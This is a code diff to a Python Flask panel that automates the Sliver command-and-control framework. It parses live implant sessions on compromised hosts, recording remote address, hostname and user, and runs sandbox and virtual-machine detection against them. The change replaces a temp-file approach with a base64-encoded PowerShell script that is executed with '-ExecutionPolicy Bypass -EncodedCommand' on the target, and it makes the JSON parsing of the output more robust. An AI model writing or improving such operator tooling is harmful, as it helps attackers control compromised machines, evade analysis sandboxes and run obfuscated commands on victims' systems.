@@ -8,6 +8,7 @@ import subprocess
 import sys
 import os
 import re
+import base64
 import tempfile
 import atexit
 import time
@@ -136,23 +137,43 @@ def list_sessions():
         # 匹配带方括号的 [ALIVE] 状态
         if '[ALIVE]' in clean_line:
             parts = clean_line.split()
-            # 格式: ID(0) Name(1) Transport(2) RemoteAddr(3) Hostname(4) Username(5) Process(PID)(6-7) OS(8) Locale(9) ... [ALIVE](last)
-            # 进程路径可能包含空格，但 PID 在括号中，所以从第6个元素开始拼接到找到 (数字)
             if len(parts) >= 10:
-                session = {
-                    "id": parts[0],
-                    "name": parts[1],
-                    "transport": parts[2],
-                    "remote_addr": parts[3],
-                    "hostname": parts[4],
-                    "username": parts[5],
-                    "health": "alive",
-                }
-                # 提取进程名和 PID：从 parts[6] 开始拼接到找到 (数字)
+                # 判断第一列是否为有效的 session ID（8位十六进制）
+                # 如果不是，说明该行缺少 Name 列，第一列实际上是 RemoteAddr
+                first_col = parts[0]
+                is_valid_id = bool(re.match(r'^[0-9a-f]{8}$', first_col))
+                
+                if is_valid_id:
+                    # 标准格式: ID(0) Name(1) Transport(2) RemoteAddr(3) Hostname(4) Username(5) ...
+                    session = {
+                        "id": parts[0],
+                        "name": parts[1],
+                        "transport": parts[2],
+                        "remote_addr": parts[3],
+                        "hostname": parts[4],
+                        "username": parts[5],
+                        "health": "alive",
+                    }
+                    start_idx = 6
+                else:
+                    # 缺少 Name 列的格式: RemoteAddr(0) Hostname(1) Username(2) Process(PID)(3-4) ...
+                    # 第一列是 RemoteAddr（如 76.103:21530），Name 为空
+                    session = {
+                        "id": "",  # 没有有效的 ID，跳过此会话
+                        "name": "",
+                        "transport": "",
+                        "remote_addr": first_col,
+                        "hostname": parts[1] if len(parts) > 1 else "",
+                        "username": parts[2] if len(parts) > 2 else "",
+                        "health": "alive",
+                    }
+                    start_idx = 3
+                
+                # 提取进程名和 PID：从 start_idx 开始拼接到找到 (数字)
                 process_parts = []
                 pid = ""
-                idx = 6
-                for p in parts[6:]:
+                idx = start_idx
+                for p in parts[start_idx:]:
                     if p.startswith('(') and p.endswith(')'):
                         pid = p.strip('()')
                         break
@@ -163,7 +184,10 @@ def list_sessions():
                 # OS 和 Locale 在 PID 之后固定位置
                 session["os"] = parts[idx + 1] if idx + 1 < len(parts) else ""
                 session["locale"] = parts[idx + 2] if idx + 2 < len(parts) else ""
-                sessions.append(session)
+                
+                # 只添加有有效 ID 的会话
+                if session["id"]:
+                    sessions.append(session)
     return jsonify({"sessions": sessions, "total": len(sessions)})
 
 
@@ -237,14 +261,22 @@ def sandbox_detect():
 
     # 检查 spawndll 是否成功
     if "Error" not in output and "error" not in output.lower():
-        # 尝试从输出中提取 JSON
         try:
-            json_start = output.find('{')
-            json_end = output.rfind('}') + 1
-            if json_start >= 0 and json_end > json_start:
-                json_str = output[json_start:json_end]
-                result = json.loads(json_str)
-                return jsonify(result)
+            json_start = output.find('{"')
+            if json_start >= 0:
+                depth = 0
+                json_end = json_start
+                for i in range(json_start, len(output)):
+                    if output[i] == '{':
+                        depth += 1
+                    elif output[i] == '}':
+                        depth -= 1
+                        if depth == 0:
+                            json_end = i + 1
+                            break
+                if json_end > json_start:
+                    result = json.loads(output[json_start:json_end])
+                    return jsonify(result)
         except:
             pass
 
@@ -334,30 +366,31 @@ foreach ($key in $vmRegKeys) {
 $results | ConvertTo-Json -Compress
 '''
     
-    # 将 PowerShell 脚本写入临时文件（用 utf-8 编码，因为脚本中有中文注释）
-    ps_file = os.path.join(tempfile.gettempdir(), "sandbox_detect.ps1")
-    with open(ps_file, "w", encoding="utf-8") as f:
-        f.write(ps_script)
-    
-    # 通过 Sliver 的 execute 命令在目标上执行 PowerShell 脚本
-    ps_cmd = f"powershell -ExecutionPolicy Bypass -File {ps_file}"
-    exec_commands = f"use {session_id}\nexecute -o {ps_cmd}"
-    exec_output = run_sliver_command(exec_commands)
-    
-    # 清理临时文件
+    # 将 PowerShell 脚本 Base64 编码，内联到命令中（目标机器上不存在本地文件）
+    ps_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode('ascii')
+    ps_cmd = f"powershell -ExecutionPolicy Bypass -EncodedCommand {ps_b64}"
+    exec_commands = f"use {session_id}\nexecute -o -- {ps_cmd}"
+    exec_output = run_sliver_command(exec_commands, timeout=180)
+
+    # 从输出中提取 JSON（在 "[*] Output:" 之后找第一个完整的 JSON 对象）
     try:
-        os.remove(ps_file)
-    except:
-        pass
-    
-    # 尝试从输出中提取 JSON
-    try:
-        json_start = exec_output.find('{')
-        json_end = exec_output.rfind('}') + 1
-        if json_start >= 0 and json_end > json_start:
-            json_str = exec_output[json_start:json_end]
-            result = json.loads(json_str)
-            return jsonify(result)
+        json_start = exec_output.find('{"')
+        if json_start >= 0:
+            # 从 { 开始找匹配的 }
+            depth = 0
+            json_end = json_start
+            for i in range(json_start, len(exec_output)):
+                if exec_output[i] == '{':
+                    depth += 1
+                elif exec_output[i] == '}':
+                    depth -= 1
+                    if depth == 0:
+                        json_end = i + 1
+                        break
+            if json_end > json_start:
+                json_str = exec_output[json_start:json_end]
+                result = json.loads(json_str)
+                return jsonify(result)
     except:
         pass
 
